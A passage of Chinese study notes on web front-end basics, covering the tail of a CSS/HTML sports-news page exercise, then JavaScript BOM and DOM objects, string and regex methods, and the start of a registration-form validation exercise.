box;\n\t-webkit-box-pack:justify;\n\toverflow: hidden;/*隐藏图片溢出部分*/\n\t/*border:1px dashed red;*/\n}\n\ndt {\n\twidth:1%;/*避免bug*/\n\tmargin-left:2%;\n\t-webkit-box-flex:4;\n\toverflow: hidden;\n\t/*border:1px dashed red;*/\n}\ndd {\n\twidth:1%;\n\tmargin-left:5%;\n\tmargin-right:2%;\n\t-webkit-box-flex:6;\n\tdisplay: -webkit-box;\n\tdisplay: box;\n\t-webkit-box-orient:vertical;\n\t/*border:1px dashed red;*/\n}\ndd h4 {/*题目6*/\n\tfont-size: 1.1em;\n\tfont-weight:lighter;\n\tline-height: 1.5em;/* 1.5倍行距 */\n\tmargin: 0;\n\t-webkit-box-flex:6;\n}\n\ndd div {\n\t-webkit-box-flex:1;\n\ttext-align:right;\n}\ndd span{\n\tfont-size: 0.7em;\n}\n/*设置评论图片与评论数垂直对齐方式*/\nimg {\n\tvertical-align: middle;\n}\n</style>\n</head>\n\n<body>\n\t<section id=\"sports\">\n\t\t<ul class=\"tit_list\"><!--题目2-->\n\t\t\t<li>体育</li>\n\t\t\t<li>NBA</li>\n\t\t\t<li>英超</li>\n\t\t\t<li>中超</li>\n\t\t</ul>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade><!--题目2-->\n\t\t<ul class=\"nav_items\"><!--题目2-->\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/guozu.jpg\"></div>\n\t\t\t\t<div>国足</div>\n\t\t\t</li>\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/xijia.png\"></div>\n\t\t\t\t<div>西甲</div>\n\t\t\t</li>\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/ouguan.jpg\"></div>\n\t\t\t\t<div>欧冠</div>\n\t\t\t</li>\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/cba.jpg\"></div>\n\t\t\t\t<div>CBA</div>\n\t\t\t</li>\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/yaguan.jpg\"></div>\n\t\t\t\t<div>亚冠</div>\n\t\t\t</li>\n\t\t</ul>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl ><!--题目4-->\n\t\t\t<dt><img src=\"images/1.jpg\"/></dt>\n\t\t\t<dd>\n\t\t\t\t<h4>游泳冠军赛孙杨1500自夺冠 豪取五金圆满收官</h4>\n\t\t\t\t<div><span> 578 <img src=\"images/timg.jpg\"/></span> </div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl>\n\t\t\t<dt><img src=\"images/2.jpg\"/></dt>\n\t\t\t<dd>\n\t\t\t\t<h4>游泳冠军赛刘湘50自折桂 徐嘉余收获第四金</h4>\n\t\t\t\t<div><span> 8 <img src=\"images/timg.jpg\"/></span></div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl>\n\t\t\t<dt><img src=\"images/3.jpg\"/></dt>\n\t\t\t<dd >\n\t\t\t\t<h4 >被称中国台北队 台湾急了:台湾不是中国大陆一部分</h4>\n\t\t\t\t<div><span> 4174 <img src=\"images/timg.jpg\"/></span> </div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl>\n\t\t\t<dt><img src=\"images/4.jpg\"/></dt>\n\t\t\t<dd>\n\t\t\t\t<h4 >中超-扎哈维2球雷鸟肖智建功 富力4-1辽足返榜首</h4>\n\t\t\t\t<div ><span> 1万 <img src=\"images/timg.jpg\"/></span> </div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl>\n\t\t\t<dt><img src=\"images/5.jpg\"/></dt>\n\t\t\t<dd>\n\t\t\t\t<h4>曝齐达内铁定留皇马！没冠军也执教 获主席力挺</h4>\n\t\t\t\t<div><span> 658 <img src=\"images/timg.jpg\"/></span> </div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade><!--题目5-->\n\t\t<div style=\"text-align:center; color:#06C;\">展开更多 <img src=\"images/xiala.jpg\"/></div>\n\t</section>\n</body>\n</html>\n```\n\n## JavaScript\n\n> JavaScript是一种属于网络的脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。\n\n### 用法\n\nHTML 中的脚本必须位于 `<script> 与 </script>` 标签之间。\n\n**内嵌脚本：**\n\n`<script>`标签放置在 HTML 页面的` <body>`或 `<head> `部分中。\n\n```javascript\n<head>\n<script language=\"javascript\">\n\talert(\"我的第一个 JavaScript\");\n</script>\n</head>\n```\n\n**链接外部js脚本**:\n\n```javascript\n<script src=\"js/welcome.js\" type=\"text/javascript\"> </script>\n```\n\n### 函数\n\n```javascript\nfunction abs(x) {\n    if (x >= 0) {\n        return x;\n    } else {\n        return -x;\n    }\n}\n```\n\n上述`abs()`函数的定义如下：\n\n- `function`指出这是一个函数定义；\n- `abs`是函数的名称；\n- `(x)`括号内列出函数的参数，多个参数以`,`分隔；\n- `{ ... }`之间的代码是函数体，可以包含若干语句，甚至可以没有任何语句。\n\n### BOM\n\n> 浏览器对象模型(**Browser Object Model**)提供了用户与浏览器对象之间交互和操作的接口。在BOM中，对象之间存在层次关系，window为顶层对象，所有其它对象都是window的子对象。\n\n#### BOM 主要对象\n\n**window:** BOM的核心，顶层对象，负责与浏览器交互的操作\n**document:** 代表浏览器载入的文档(如HTML文件)\n**navigator:**  包含浏览器信息(HTML5新增geolocation属性)\n**history:** 包含浏览窗口访问过的URL\n**location:** 包含当前文档URL的信息\n**screen:** 包含客户端屏幕信息（移动设备特别需要）\n**本地存储:**localStorage和sessionStorage（HTML5新增）\n**离线应用:**（HTML5新增）\n\n### **Window** 对象\n\n##### 打开、关闭、调整窗口\n\n```js\nwindow.open();//打开空白窗口\n\nwindow.open('http://www.baidu.html');\n\nwindow.close();//关闭窗口\n```\n\n##### 警告、确认、输入对话框\n\n| **方法**  | **描述**                                         |\n| --------- | ------------------------------------------------ |\n| alert()   | 显示带有一段消息和一个确认按钮的警告框。         |\n| confirm() | 显示带有一段消息以及确认按钮和取消按钮的对话框。 |\n| prompt()  | 显示可提示用户输入的对话框，并返回用户输入信息。 |\n\n**altert(text)**\n\n```javascript\n<script>\n\talert(\"测试一哈\");\n</script>\n```\n\n**confirm(text)**\n\n```javascript\n<script>\n\tvar r=confirm(\"Press a button\");\n \t if (r==true)\n   \t     alert(\"You pressed OK!\");  \n  \telse    \n \t    alert(\"You pressed Cancel!\") ;\n</script>\n```\n\n**prompt(text,default)**\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=GBK\" />\n\t<title> 输入对话框 </title>\n</head>\n<body>\n\t你的名字是：<span id=\"name\"></span>\n\t<script type=\"text/javascript\">\n\t\tname = prompt(\"请输入你的名字：\",\"简简\");\n\t\tdocument.getElementById(\"name\").innerHTML = name;\n\t</script>\n</body>\n</html>\n```\n\n### document **对象**\n\n| 属性            | 描述                                    |\n| :-------------- | :-------------------------------------- |\n| body            | 返回 <body> 元素                        |\n| forms           | 返回所有表单元素对象，可当成数组来使用  |\n| cookie          | 设置或返回与当前文档有关的所有 cookie。 |\n| domain          | 返回当前文档的域名。                    |\n| lastModified    | 返回文档被最后修改的日期和时间。        |\n| referrer        | 返回载入当前文档的文档的 URL。          |\n| title           | 返回当前文档的标题。                    |\n| URL             | 返回当前文档的 URL。                    |\n| readyState      | 返回文档的（加载）状态                  |\n| documentElement | 返回文档根节点，<html>                  |\n| images          | 返回所有Image对象，<img>                |\n\n```javascript\n<script>\n    alert(document.cookie);\n\twrite(document.URL);\n</script>;\n```\n#### document.forms的用法\n\n| 代码                        | 作用                                                      |\n| --------------------------- | --------------------------------------------------------- |\n| document.forms              | 表示获取当前页面的所有表单                                |\n| document.forms[0]           | 表示获取当前页面的第一个表单                              |\n| document.forms['user_form'] | 表示获取当前页面的name=\"user_form\"的表单                  |\n| document.forms[0].submit()  | 表示提交第一个form表单  提交到form里面的 action指向的地方 |\n\n#### document 对象方法\n\n| 方法                                                         | 描述                                                         |\n| :----------------------------------------------------------- | :----------------------------------------------------------- |\n| [close()](https://www.w3school.com.cn/jsref/met_doc_close.asp) | 关闭用 document.open() 方法打开的输出流，并显示选定的数据。  |\n| [getElementById()](https://www.w3school.com.cn/jsref/met_doc_getelementbyid.asp) | 返回对拥有指定 id 的第一个对象的引用。                       |\n| [getElementsByName()](https://www.w3school.com.cn/jsref/met_doc_getelementsbyname.asp) | 返回带有指定名称的对象集合。                                 |\n| [getElementsByTagName()](https://www.w3school.com.cn/jsref/met_doc_getelementsbytagname.asp) | 返回带有指定标签名的对象集合。                               |\n| [open()](https://www.w3school.com.cn/jsref/met_doc_open.asp) | 打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。 |\n| [write()](https://www.w3school.com.cn/jsref/met_doc_write.asp) | 向文档写 HTML 表达式 或 JavaScript 代码。                    |\n| [writeln()](https://www.w3school.com.cn/jsref/met_doc_writeln.asp) | 等同于 write() 方法，不同的是在每个表达式之后写一个换行符。  |\n\n```javascript\n<script>   \n    var a=1,b=2;\n    document.write(\"<h1>a+b</h1>\");\n    document.write(\"=\");\n    document.writeln(a+b);\n</script>\n```\n\n### location 对象\n\n| 属性              | 描述                                          |\n| :---------------- | :-------------------------------------------- |\n| location.hash     | 设置或返回从井号 (#) 开始的 URL（锚）。       |\n| location.host     | 设置或返回主机名和当前 URL 的端口号。         |\n| location.hostname | 设置或返回当前 URL 的主机名。                 |\n| location.href     | 设置或返回完整的 URL。                        |\n| location.pathname | 设置或返回当前 URL 的路径部分。               |\n| location.port     | 设置或返回当前 URL 的端口号。                 |\n| location.protocol | 设置或返回当前 URL 的协议。                   |\n| location.search   | 设置或返回从问号 (?) 开始的 URL（查询部分）。 |\n\n```javascript\n<script type=\"text/javascript\">\n\tvar loc = window.location;\n\tvar locStr = \"当前的location信息是:\\n\";\n\t// 遍历location对象的全部属性\n\tfor (var propname in loc)\n\t{\n\t\tlocStr += propname + \": \" + loc[propname] + \"\\n\"\n\t}\n\talert(locStr);\n</script>\n```\n\n| 方法      | 描述                     |\n| :-------- | :----------------------- |\n| assign()  | 加载新的文档。           |\n| reload()  | 重新加载当前文档。       |\n| replace() | 用新的文档替换当前文档。 |\n\n```html\n<!doctype html>\n<html>\n<head>\n<title>location对象</title>\n</head>\n<body>\n<div id=\"typeMachine\" onclick = \"clcFun()\">戳我啊</div>\n<script>\n\tfunction clcFun () {\n\t\tdocument.write(location.href);//打印出当前地址\n\t\t//window.location.reload();//重新加载html文档\n\t\t//window.location.href=\"http://www.baidu.com\"//打开网页,方式1\n\t\t//window.location.assign(\"http://www.baidu.com\");//打开网页,方式2\n\t\t//window.location.replace(\"http://www.baidu.com\");//打开网页,方式3\n\t}\n</script>\n</body>\n</html>\n```\n\n### History 对象\n\n| 属性、方法                                                   | 描述                                |\n| :----------------------------------------------------------- | :---------------------------------- |\n| [length](https://www.w3school.com.cn/jsref/prop_his_length.asp) | 返回浏览器历史列表中的 URL 数量。   |\n| [back()](https://www.w3school.com.cn/jsref/met_his_back.asp) | 加载 history 列表中的前一个 URL。   |\n| [forward()](https://www.w3school.com.cn/jsref/met_his_forward.asp) | 加载 history 列表中的下一个 URL。   |\n| [go()](https://www.w3school.com.cn/jsref/met_his_go.asp)     | 加载 history 列表中的某个具体页面。 |\n\n### Navigator 对象\n\n| 属性                                                         | 描述                                           |\n| :----------------------------------------------------------- | :--------------------------------------------- |\n| [appCodeName](https://www.w3school.com.cn/jsref/prop_nav_appcodename.asp) | 返回浏览器的代码名。                           |\n| [appMinorVersion](https://www.w3school.com.cn/jsref/prop_nav_appminorversion.asp) | 返回浏览器的次级版本。                         |\n| [appName](https://www.w3school.com.cn/jsref/prop_nav_appname.asp) | 返回浏览器的名称。                             |\n| [appVersion](https://www.w3school.com.cn/jsref/prop_nav_appversion.asp) | 返回浏览器的平台和版本信息。                   |\n| [browserLanguage](https://www.w3school.com.cn/jsref/prop_nav_browserlanguage.asp) | 返回当前浏览器的语言。                         |\n| [cookieEnabled](https://www.w3school.com.cn/jsref/prop_nav_cookieenabled.asp) | 返回指明浏览器中是否启用 cookie 的布尔值。     |\n| [cpuClass](https://www.w3school.com.cn/jsref/prop_nav_cpuclass.asp) | 返回浏览器系统的 CPU 等级。                    |\n| [onLine](https://www.w3school.com.cn/jsref/prop_nav_online.asp) | 返回指明系统是否处于脱机模式的布尔值。         |\n| [platform](https://www.w3school.com.cn/jsref/prop_nav_platform.asp) | 返回运行浏览器的操作系统平台。                 |\n| [systemLanguage](https://www.w3school.com.cn/jsref/prop_nav_systemlanguage.asp) | 返回 OS 使用的默认语言。                       |\n| [userAgent](https://www.w3school.com.cn/jsref/prop_nav_useragent.asp) | 返回由客户机发送服务器的 user-agent 头部的值。 |\n| [userLanguage](https://www.w3school.com.cn/jsref/prop_nav_userlanguage.asp) | 返回 OS 的自然语言设置。                       |\n\n#### Navigator 对象方法\n\n| 方法                                                         | 描述                                         |\n| :----------------------------------------------------------- | :------------------------------------------- |\n| [javaEnabled()](https://www.w3school.com.cn/jsref/met_nav_javaenabled.asp) | 规定浏览器是否启用 Java。                    |\n| [taintEnabled()](https://www.w3school.com.cn/jsref/met_nav_taintenabled.asp) | 规定浏览器是否启用数据污点 (data tainting)。 |\n\n### Screen 对象\n\n| 属性                                                         | 描述                                         |\n| :----------------------------------------------------------- | :------------------------------------------- |\n| [availHeight](https://www.w3school.com.cn/jsref/prop_screen_availheight.asp) | 返回显示屏幕的高度 (除 Windows 任务栏之外)。 |\n| [availWidth](https://www.w3school.com.cn/jsref/prop_screen_availwidth.asp) | 返回显示屏幕的宽度 (除 Windows 任务栏之外)。 |\n| [bufferDepth](https://www.w3school.com.cn/jsref/prop_screen_bufferdepth.asp) | 设置或返回调色板的比特深度。                 |\n| [colorDepth](https://www.w3school.com.cn/jsref/prop_screen_colordepth.asp) | 返回目标设备或缓冲器上的调色板的比特深度。   |\n| [deviceXDPI](https://www.w3school.com.cn/jsref/prop_screen_devicexdpi.asp) | 返回显示屏幕的每英寸水平点数。               |\n| [deviceYDPI](https://www.w3school.com.cn/jsref/prop_screen_deviceydpi.asp) | 返回显示屏幕的每英寸垂直点数。               |\n| [fontSmoothingEnabled](https://www.w3school.com.cn/jsref/prop_screen_fontsmoothingenabled.asp) | 返回用户是否在显示控制面板中启用了字体平滑。 |\n| [height](https://www.w3school.com.cn/jsref/prop_screen_height.asp) | 返回显示屏幕的高度。                         |\n| [logicalXDPI](https://www.w3school.com.cn/jsref/prop_screen_logicalxdpi.asp) | 返回显示屏幕每英寸的水平方向的常规点数。     |\n| [logicalYDPI](https://www.w3school.com.cn/jsref/prop_screen_logicalydpi.asp) | 返回显示屏幕每英寸的垂直方向的常规点数。     |\n| [pixelDepth](https://www.w3school.com.cn/jsref/prop_screen_pixeldepth.asp) | 返回显示屏幕的颜色分辨率（比特每像素）。     |\n| [updateInterval](https://www.w3school.com.cn/jsref/prop_screen_updateinterval.asp) | 设置或返回屏幕的刷新率。                     |\n| [width](https://www.w3school.com.cn/jsref/prop_screen_width.asp) | 返回显示器屏幕的宽度。                       |\n\n### DOM\n\n> **Document Object Model**简称DOM，采取直观、一致的方式对结构化文档（HTML、XML）进行模型化处理，形成一棵结构化的文档树。\n\n​\t每个HTML文档被加载后都会在内存中初始化一个document对象，该对象存放整个网页HTML内容，从该对象中可获取页面任何元素，包括表单的各种信息。\n\n​\tDOM为常用的HTML元素提供了一套完整的接口/类体系。从页面的document对象到每个常用的HTML元素，DOM模型都提供了对应的接口/类，每个接口/类都提供了相应的方法来操作DOM元素本身、属性及其子元素。\n\n![](https://i.loli.net/2020/05/13/vdJHBsp53oIOtrf.png)\n\n### DOM Event 对象\n\n| 属性                                                         | 此事件发生在何时...                  |\n| :----------------------------------------------------------- | :----------------------------------- |\n| [onabort](https://www.w3school.com.cn/jsref/event_onabort.asp) | 图像的加载被中断。                   |\n| [onblur](https://www.w3school.com.cn/jsref/event_onblur.asp) | 元素失去焦点。                       |\n| [onchange](https://www.w3school.com.cn/jsref/event_onchange.asp) | 当元素获取焦点，且值发生改变时触发。 |\n| [onclick](https://www.w3school.com.cn/jsref/event_onclick.asp) | 当用户点击某个对象时调用的事件句柄。 |\n| [ondblclick](https://www.w3school.com.cn/jsref/event_ondblclick.asp) | 当用户双击某个对象时调用的事件句柄。 |\n| [onerror](https://www.w3school.com.cn/jsref/event_onerror.asp) | 在加载文档或图像时发生错误。         |\n| [onfocus](https://www.w3school.com.cn/jsref/event_onfocus.asp) | 元素获得焦点。                       |\n| [onkeydown](https://www.w3school.com.cn/jsref/event_onkeydown.asp) | 某个键盘按键被按下。                 |\n| [onkeypress](https://www.w3school.com.cn/jsref/event_onkeypress.asp) | 某个键盘按键被按下并松开。           |\n| [onkeyup](https://www.w3school.com.cn/jsref/event_onkeyup.asp) | 某个键盘按键被松开。                 |\n| [onload](https://www.w3school.com.cn/jsref/event_onload.asp) | 一张页面或一幅图像完成加载。         |\n| [onmousedown](https://www.w3school.com.cn/jsref/event_onmousedown.asp) | 鼠标按钮被按下。                     |\n| [onmousemove](https://www.w3school.com.cn/jsref/event_onmousemove.asp) | 鼠标被移动。                         |\n| [onmouseout](https://www.w3school.com.cn/jsref/event_onmouseout.asp) | 鼠标从某元素移开。                   |\n| [onmouseover](https://www.w3school.com.cn/jsref/event_onmouseover.asp) | 鼠标移到某元素之上。                 |\n| [onmouseup](https://www.w3school.com.cn/jsref/event_onmouseup.asp) | 鼠标按键被松开。                     |\n| [onreset](https://www.w3school.com.cn/jsref/event_onreset.asp) | 重置按钮被点击。                     |\n| [onresize](https://www.w3school.com.cn/jsref/event_onresize.asp) | 窗口或框架被重新调整大小。           |\n| [onselect](https://www.w3school.com.cn/jsref/event_onselect.asp) | 文本被选中。                         |\n| [onsubmit](https://www.w3school.com.cn/jsref/event_onsubmit.asp) | 确认按钮被点击。                     |\n| [onunload](https://www.w3school.com.cn/jsref/event_onunload.asp) | 用户退出页面。                       |\n\n### JavaScript String 对象\n\n| 方法                                                         | 描述                                                 |\n| :----------------------------------------------------------- | :--------------------------------------------------- |\n| [anchor()](https://www.w3school.com.cn/jsref/jsref_anchor.asp) | 创建 HTML 锚。                                       |\n| [big()](https://www.w3school.com.cn/jsref/jsref_big.asp)     | 用大号字体显示字符串。                               |\n| [blink()](https://www.w3school.com.cn/jsref/jsref_blink.asp) | 显示闪动字符串。                                     |\n| [bold()](https://www.w3school.com.cn/jsref/jsref_bold.asp)   | 使用粗体显示字符串。                                 |\n| [charAt()](https://www.w3school.com.cn/jsref/jsref_charAt.asp) | 返回在指定位置的字符。                               |\n| [charCodeAt()](https://www.w3school.com.cn/jsref/jsref_charCodeAt.asp) | 返回在指定的位置的字符的 Unicode 编码。              |\n| [concat()](https://www.w3school.com.cn/jsref/jsref_concat_string.asp) | 连接字符串。                                         |\n| [fixed()](https://www.w3school.com.cn/jsref/jsref_fixed.asp) | 以打字机文本显示字符串。                             |\n| [fontcolor()](https://www.w3school.com.cn/jsref/jsref_fontcolor.asp) | 使用指定的颜色来显示字符串。                         |\n| [fontsize()](https://www.w3school.com.cn/jsref/jsref_fontsize.asp) | 使用指定的尺寸来显示字符串。                         |\n| [fromCharCode()](https://www.w3school.com.cn/jsref/jsref_fromCharCode.asp) | 从字符编码创建一个字符串。                           |\n| [indexOf()](https://www.w3school.com.cn/jsref/jsref_indexOf.asp) | 检索字符串。                                         |\n| [italics()](https://www.w3school.com.cn/jsref/jsref_italics.asp) | 使用斜体显示字符串。                                 |\n| [lastIndexOf()](https://www.w3school.com.cn/jsref/jsref_lastIndexOf.asp) | 从后向前搜索字符串。                                 |\n| [link()](https://www.w3school.com.cn/jsref/jsref_link.asp)   | 将字符串显示为链接。                                 |\n| [localeCompare()](https://www.w3school.com.cn/jsref/jsref_localeCompare.asp) | 用本地特定的顺序来比较两个字符串。                   |\n| [match()](https://www.w3school.com.cn/jsref/jsref_match.asp) | 找到一个或多个正则表达式的匹配。                     |\n| [replace()](https://www.w3school.com.cn/jsref/jsref_replace.asp) | 替换与正则表达式匹配的子串。                         |\n| [search()](https://www.w3school.com.cn/jsref/jsref_search.asp) | 检索与正则表达式相匹配的值。                         |\n| [slice()](https://www.w3school.com.cn/jsref/jsref_slice_string.asp) | 提取字符串的片断，并在新的字符串中返回被提取的部分。 |\n| [small()](https://www.w3school.com.cn/jsref/jsref_small.asp) | 使用小字号来显示字符串。                             |\n| [split()](https://www.w3school.com.cn/jsref/jsref_split.asp) | 把字符串分割为字符串数组。                           |\n| [strike()](https://www.w3school.com.cn/jsref/jsref_strike.asp) | 使用删除线来显示字符串。                             |\n| [sub()](https://www.w3school.com.cn/jsref/jsref_sub.asp)     | 把字符串显示为下标。                                 |\n| [substr()](https://www.w3school.com.cn/jsref/jsref_substr.asp) | 从起始索引号提取字符串中指定数目的字符。             |\n| [substring()](https://www.w3school.com.cn/jsref/jsref_substring.asp) | 提取字符串中两个指定的索引号之间的字符。             |\n| [sup()](https://www.w3school.com.cn/jsref/jsref_sup.asp)     | 把字符串显示为上标。                                 |\n| [toLocaleLowerCase()](https://www.w3school.com.cn/jsref/jsref_toLocaleLowerCase.asp) | 把字符串转换为小写。                                 |\n| [toLocaleUpperCase()](https://www.w3school.com.cn/jsref/jsref_toLocaleUpperCase.asp) | 把字符串转换为大写。                                 |\n| [toLowerCase()](https://www.w3school.com.cn/jsref/jsref_toLowerCase.asp) | 把字符串转换为小写。                                 |\n| [toUpperCase()](https://www.w3school.com.cn/jsref/jsref_toUpperCase.asp) | 把字符串转换为大写。                                 |\n| toSource()                                                   | 代表对象的源代码。                                   |\n| [toString()](https://www.w3school.com.cn/jsref/jsref_toString_string.asp) | 返回字符串。                                         |\n| trim()                                                       | 去除字符串两边的空空格                               |\n| [valueOf()](https://www.w3school.com.cn/jsref/jsref_valueOf_string.asp) | 返回某个字符串对象的原始值。                         |\n\nindexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。\n\nlastIndexOf() 方法可返回一个指定的字符串值最后出现的位置，在一个字符串中的指定位置从后向前搜索。\n\ntrim() 方法用于删除字符串的头尾空格。\n\n### JavaScript RegExp 对象\n\n| 方法                                                         | 描述                                               |\n| :----------------------------------------------------------- | :------------------------------------------------- |\n| [compile](https://www.w3school.com.cn/jsref/jsref_regexp_compile.asp) | 编译正则表达式。                                   |\n| [exec](https://www.w3school.com.cn/jsref/jsref_exec_regexp.asp) | 检索字符串中指定的值。返回找到的值，并确定其位置。 |\n| [test](https://www.w3school.com.cn/jsref/jsref_test_regexp.asp) | 检索字符串中指定的值。返回 true 或 false。         |\n\ntest() 方法用于检测一个字符串是否匹配某个模式.\n\n```\nRegExpObject.test(string)\n```\n\n```javascript\nif(!(/^[1][3,4,5,7,8][0-9]{9}$/).test(tel))\n\t\talert(\"手机号格式错误！\");\n\nif(!(/^[1][3,4,5,7,8]\\d{9}$/).test(tel))\n\t\talert(\"手机号格式错误！\");\n```\n\n表达式的意思是：\n\n1--以1为开头；\n\n2--第二位可为3,4,5,7,8,中的任意一位；\n\n3--[0-9]的数 \\d代表数字\n\n4--9次[0-9]\n\n### 获得HTML元素节点\n\n>  为动态地修改HTML页面，首先需要获得HTML元素对象。\n\n•通过HTML标签的id属性：\n\n```javascript\n  var xEle=document.getElementById(“xElement”);\n   没有则返回null\n```\n\n•通过表单的name属性：\n\n```javascript\n  var nodeinp=document.form[0].user_name;\n```\n\n•通过CSS选择器：\n\n```javascript\nvar node=document.querySelector(“#myColor_1”);\n   //返回一个node节点\n```\n\n### 修改HTML元素\n\n> 包括修改节点的内容、属性和CSS样式\n\n| **属性**           | **说明**                                   |\n| ------------------ | ------------------------------------------ |\n| **innerHTML**      | 设置或获取位于对象起始和结束标签内的 HTML  |\n| **outerHTML**      | 设置或获取对象及其内容的 HTML 形式         |\n| **innerText**      | 设置或获取位于对象起始和结束标签内的文本   |\n| **outerText**      | 设置(包括标签)或获取(不包括标签)对象的文本 |\n| **value**          | 设置或获取表单元素的value属性值            |\n| **options[index]** | 设置或获取表单中列表、下拉菜单的选项内容   |\n| **className**      | 修改HTML元素的CSS样式                      |\n| **style**          | 修改HTML元素的内联CSS样式                  |\n\n#### 修改HTML元素--内容\n\n![](https://i.loli.net/2020/05/13/r2cIvX6stAOU7Le.png)\n\n\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">  \n<title>innerHTML、outerHTML和innerText、outerHTML的区别</title>  \n   \n</head>   \n<body>   \n\t　<ul>   \n    　　<li id=\"test_id1\" onclick=\"innerHTMLDemo()\">innerHTML效果.</li>   \n\t　　<li id=\"test_id2\" onclick=\"innerTextDemo()\">innerText效果.</li>   \n\t　　<li id=\"test_id3\" onclick=\"outerHTMLDemo()\">outerHTML效果.</li>   \n\t　　<li id=\"test_id4\" onclick=\"outerTextDemo()\">outerText效果.</li>   \n\t　</ul>  \n\t\n\t<script language=\"JavaScript\" type=\"text/javascript\">   \n　　//.innerHTML  \n　　function innerHTMLDemo()  \n　　{   \n　　　test_id1.innerHTML=\"<i><u>设置或获取位于对象起始和结束标签内的 HTML.</u></i>\";   \n　　}   \n\t　　//.innerText  \n　　function innerTextDemo()  \n　　{   \n　　　test_id2.innerText=\"<i><u>设置或获取位于对象起始和结束标签内的文本.</u></i>\";   \n　　}   \n\t　　//.outerHTML  \n　　function outerHTMLDemo()  \n　　{   \n\t　　　test_id3.outerHTML=\"<font size=9pt color=red><i><u>设置或获取对象及其内容的 HTML 形式.</u></i></font>\";   \n　　}  \n\t　　//.outerText  \n　　function outerTextDemo()  \n  　{   \n　　　test_id4.outerText=\"<br></br><i><u>设置(包括标签)或获取(不包括标签)对象的文本.</u></i>\";   \n　　}  \n　</script>    \n</body>   \n</html>  \n```\n\n## JavaScript实例练习\n\n### 目的\n\n- 掌握JavaScript脚本的调用和基本语法；\n- 掌握JavaScript常用内置对象的基本应用；\n\n- 掌握BOM和window消息对话框的使用；\n\n- 掌握HTML DOM动态网页设计技术。 \n\n### 题目\n\n**为Register.html编写JavaScript脚本文件，采用链接方式调用，实现如下功能：**\n\n> (1)\t当用户填写非空白用户名、学号和密码后，将输入域后的星号变为灰色，当用户清除输入域时，将星号变为灰色，见图1；\n> (2)\t当用户单击“注册”按钮时，读取用户的姓名、学号、性别、住址和爱好信息，然后使用确认消息对话框显示这些信息，并提示用户是否继续提交，见图2；\n> 如果继续，则对表单数据做如下检验、处理和提示（见图3）：\n> (3)\t检验用户名不能为空，清除用户名两端多余空格，最后向服务器提交去掉空格后的用户名；\n> (4)\t密码必须为8位，且两次输入密码相同；\n> (5)\t电话号码必须位11位数字；\n> (6)\t邮件地址中必须包含且只包含一个“@”符号，并且“@”不能是地址第一和最后一个字符。\n\n| 效果图                                                  | 效果图                                                       |\n| ------------------------------------------------------- | ------------------------------------------------------------ |\n| ![图1](https://img.jwt1399.top//img/20200811155651.jpg) | ![图2](https://img.jwt1399.top//img/20200811155645.png)![图3](https://img.jwt1399.top//img/20200811155622.png) |\n| ![图3](https://img.jwt1399.top//img/20200811155629.png) | ![图3](https://img.jwt1399.top//img/20200811155625.png)      |\n\n### 解答\n\n#### Register.html\n\n```html\n<!doctype html>\n<html>\n\t<head>\n\t<meta charset=\"utf-8\">\n\t<title>新生报到</title>\n\t<link href=\"style/Register.css\" rel=\"stylesheet\" type=\"text/css\">\n\t<script src=\"js/Register.js\"></script>\n\t</head>\n\t<body>\n\t<div id=\"wrapper\">\n\t\t<h3 id=\"title\" align=\"center\">注 册 信 息</h3>\n\t\t<hr noshade size=\"1\" width=\"99%\">\n\t\t<form action=\"\" name=\"regForm\" id=\"regForm\" autocomplete=\"on\" method=\"get\">\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">姓名：</span>  \n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_name\" maxlength=\"10\" autofocus required onChange=\"changeStatus(this)\"/><span class=\"star\"> *</span>\n\t\t\t</div>\n\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">学号：</span>  \n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_id\" required onChange=\"changeStatus(this)\"/><span class=\"star\"> *</span>\n\t\t\t</div>\t\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">密码：</span> \n\t\t\t\t<input type=\"password\" class=\"item-inp\" name=\"user_pwd1\"  placeholder=\"请输入8位密码\" required onChange=\"changeStatus(this)\"/><span class=\"star\"> *</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">确认密码：</span> \n\t\t\t\t<input type=\"password\" class=\"item-inp\" name=\"user_pwd2\"  placeholder=\"请输入相同的密码\" required onChange=\"changeStatus(this)\"/><span class=\"star\"> *</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">性别：</span>\n\t\t\t\t<div class=\"item-inp\"><label><input type=\"radio\" name=\"user_sex\" value=\"男\"/><span>男</span></label>\n\t\t\t\t<input type=\"radio\" id=\"user_sex\"  name=\"user_sex\" value=\"女\" checked/><label for=\"user_sex\">女</label>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">身高：</span>\n\t\t\t\t<input type=\"number\" class=\"item-inp\" name=\"user_height\" min=\"150\" max=\"190\" value=\"175\" step=\"5\" 